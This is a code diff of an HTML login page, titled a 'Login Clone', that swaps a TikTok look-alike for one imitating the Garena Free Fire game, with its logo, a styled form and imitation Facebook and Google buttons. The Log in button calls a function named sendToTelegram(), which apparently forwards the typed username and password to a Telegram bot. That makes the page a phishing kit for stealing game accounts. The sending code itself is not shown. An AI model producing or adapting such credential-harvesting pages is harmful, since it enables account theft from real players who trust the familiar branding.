@@ -3,34 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Login Clone</title>
+    <title>Free Fire Login Clone</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: url('https://images4.alphacoders.com/110/1109972.jpg') no-repeat center center/cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .login-container {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            color: white;
+            backdrop-filter: blur(10px);
+        }
+        .login-container img {
+            width: 180px;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #666;
+            border-radius: 6px;
+            font-size: 16px;
+            background: #222;
+            color: white;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            background: linear-gradient(45deg, #ffcc00, #ff6600);
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .login-container button:hover {
+            background: linear-gradient(45deg, #ff6600, #ffcc00);
+        }
+        .forgot-password, .signup {
+            font-size: 14px;
+            margin-top: 12px;
+        }
+        .forgot-password a, .signup a {
+            color: #ffcc00;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .social-login {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-between;
+        }
+        .social-login button {
+            width: 48%;
+            padding: 10px;
+            font-size: 14px;
+            border-radius: 6px;
+            border: none;
+            cursor: pointer;
+        }
+        .facebook-btn {
+            background: #1877f2;
+            color: white;
+        }
+        .google-btn {
+            background: #db4437;
+            color: white;
+        }
+    </style>
 </head>
-<body class="flex items-center justify-center min-h-screen bg-gray-100">
-    <div class="w-full max-w-sm p-6 bg-white rounded-lg shadow-md">
-        <div class="flex justify-center mb-6">
-            <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok" class="h-10">
-        </div>
-        <h2 class="text-2xl font-semibold text-center">Log in</h2>
-        <form class="mt-4">
-            <label class="block mb-2 text-sm font-medium">Email or Username</label>
-            <input type="text" id="email-or-username" placeholder="Email or username" class="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-            
-            <label class="block mt-4 mb-2 text-sm font-medium">Password</label>
-            <div class="relative">
-                <input type="password" id="password" placeholder="Password" class="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
-                <span class="absolute inset-y-0 right-3 flex items-center text-gray-500 cursor-pointer">👁️</span>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/en/2/2e/Garena_Free_Fire_logo.png" alt="Free Fire Logo">
+        <h2 class="text-2xl font-semibold">Log in to Free Fire</h2>
+        <form>
+            <input type="text" id="username-or-email" placeholder="Username or Email">
+            <input type="password" id="password" placeholder="Password">
+            <div class="forgot-password">
+                <a href="#">Forgot password?</a>
             </div>
-            
-            <div class="mt-2 text-right text-sm text-blue-500 cursor-pointer">Forgot password?</div>
-            
-            <button type="button" class="w-full mt-4 p-2 bg-gray-300 text-gray-500 rounded-md cursor-not-allowed" onclick="sendToTelegram()">Log in</button>
+            <button type="button" onclick="sendToTelegram()">Log in</button>
         </form>
-        <div class="mt-4 text-center text-sm">
-            <a href="#" class="text-blue-500">Go back</a>
+        <div class="social-login">
+            <button class="facebook-btn">Login with Facebook</button>
+            <button class="google-btn">Login with Google</button>
         </div>
-        <div class="mt-4 text-center text-sm">
-            Don't have an account? <a href="#" class="text-red-500">Sign up</a>
+        <div class="signup">
+            Don't have an account? <a href="#">Sign up</a>
         </div>
     </div>
 
